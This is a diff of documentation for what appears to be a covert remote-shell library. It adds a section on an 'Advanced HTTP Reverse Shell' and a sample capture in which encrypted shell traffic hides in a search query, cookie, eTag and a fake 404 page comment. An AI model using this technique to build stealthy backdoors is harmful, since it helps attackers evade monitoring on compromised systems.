@@ -1,7 +1,14 @@
 
 Programming Examples
 =====================
-In all examples Encryption and Chunking are build-in features.
+Examples can be run using the makefile available in the repo, as shown below:
+.. code :: bash
+
+	make EX='examples/example_script.py 8080' run
+
+
+Notice that examples have to be tested in pairs (agents - handlers).
+
 
 Simple TCP Bind Shell
 ---------------------
@@ -51,42 +58,55 @@ Server - Handler
 
 
 
-Packet Hex Dump ( `ls` command and response ) ::
+Advanced HTTP Reverse Shell
+---------------------------
 
-    06:50:23.541910 IP 127.0.0.1.53676 > 127.0.0.2.8012: Flags [S], seq 4049783139, win 43690, options [mss 65495,sackOK,TS val 58905769 ecr 0,nop,wscale 7], length 0
-    ..............E..<..@.@..............L.b.c.........1.........
-    ............
-    06:50:23.541921 IP 127.0.0.2.8012 > 127.0.0.1.53676: Flags [S.], seq 178116363, ack 4049783140, win 43690, options [mss 65495,sackOK,TS val 58905769 ecr 58905769,nop,wscale 7], length 0
-    ..............E..<..@.@.<..........L..
-    ....b.d.....1.........
-    ............
-    06:50:23.541929 IP 127.0.0.1.53676 > 127.0.0.2.8012: Flags [.], ack 1, win 342, options [nop,nop,TS val 58905769 ecr 58905769], length 0
-    ..............E..4..@.@..............L.b.d
-    ......V.).....
-    ........
-    06:50:24.927298 IP 127.0.0.1.53676 > 127.0.0.2.8012: Flags [P.], seq 1:51, ack 1, win 342, options [nop,nop,TS val 58906115 ecr 58905769], length 50
-    ..............E..f..@.@..............L.b.d
-    ......V.[.....
-    ........".D.L{.....G.tve.,....u....q.!.".v7.{...6.>....OQ2
-    06:50:24.927497 IP 127.0.0.2.8012 > 127.0.0.1.53676: Flags [.], ack 51, win 342, options [nop,nop,TS val 58906116 ecr 58906115], length 0
-    ..............E..4..@.@.9..........L..
-    ....b.....V.).....
-    ........
-    06:50:24.931759 IP 127.0.0.2.8012 > 127.0.0.1.53676: Flags [P.], seq 1:51, ack 51, win 342, options [nop,nop,TS val 58906117 ecr 58906115], length 50
-    ..............E..f..@.@.8..........L..
-    ....b.....V.[.....
-    ........"..0(.9...AE.......>;m......3.M*2..f.S.R..>....OI.
-    06:50:24.931772 IP 127.0.0.1.53676 > 127.0.0.2.8012: Flags [.], ack 51, win 342, options [nop,nop,TS val 58906117 ecr 58906117], length 0
-    ..............E..4..@.@..............L.b..
-    ..>...V.).....
-    ........
-    06:50:26.630345 IP 127.0.0.1.53676 > 127.0.0.2.8012: Flags [F.], seq 51, ack 51, win 342, options [nop,nop,TS val 58906541 ecr 58906117], length 0
-    ..............E..4..@.@..............L.b..
-    ..>...V.).....
-    ........
-    06:50:26.672055 IP 127.0.0.2.8012 > 127.0.0.1.53676: Flags [.], ack 52, win 342, options [nop,nop,TS val 58906552 ecr 58906541], length 0
-    ..............E..4..@.@.9..........L..
-    ..>.b.....V.).....
-    ........
+Client - Agent
+***************
 
-Notice: All data packets (PUSH flag) have a payload of exactly 50 bytes, which is encrypted with One-Time-Pad algorithm described in :class:`PseudoOTP.OTPKey`.
+.. literalinclude:: ../examples/http_reverse_agent.py
+
+
+Server - Handler
+****************
+
+.. literalinclude:: ../examples/http_reverse_handler.py
+
+
+Please notice that this example will work for only 1 reverse connection. Other connections will jam as of the Cycling Encryption Key.
+To
+
+Wireshark HTTP stream
+*********************
+
+
+**HTTP Request** ::
+
+	GET /search.php?q=01e45e90?userid=6c8a34140ef540caa9acc5221ca3be54bc1425 HTTP/1.1
+	Host: {0}
+	Cookie: SESSIOID=6626d881415241b388b44b52837465e4ed2b2504f9f16893716c25a1f81e9c5809b5485281acf68327ada9d3c6be170afb3ff5ac8d4de0e77e3dd9eeb089fbe1
+	eTag: c9262c8fa9cf36472fc556f39f9446c25c5433
+
+
+**HTTP Response** ::
+
+	HTTP/1.1 404 Not Found
+	Date: Sun, 18 Oct 2012 10:36:20 GMT
+	Server: Apache/2.2.14 (Win32)
+	Content-Length: 363
+	Connection: Closed
+	Content-Type: text/html; charset=iso-8859-1
+
+	<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+	<html>
+	<head>
+	   <title>404 Not Found</title>
+	</head>
+	<body>
+	   <h1>Not Found</h1>
+	   <p>The requested URL was not found on this server.</p>
+	</body>
+	<!-- Reference Code: d90a2b5e614c0b0a28c438e8100f16537f854c5a193
+	c0b7da2ca674b2583cf328fe7f7f0cf49e8932ce9dd5f08a362c92f7d923867ffb4b196b885461e12a892
+	-->
+	</html>
